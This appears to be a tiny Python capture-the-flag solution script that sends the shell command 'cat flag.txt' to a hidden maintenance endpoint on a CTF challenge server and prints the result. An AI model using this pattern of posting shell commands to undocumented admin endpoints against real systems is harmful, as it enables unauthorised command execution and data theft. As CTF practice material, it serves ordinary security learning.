#!/usr/bin/env python3
import requests
data = {"cmd": "cat flag.txt"}
url = "http://challenge.acictf.com:48390/secret_maintenance_foo_543212345"
response = requests.post(url, data)
print(response.text)
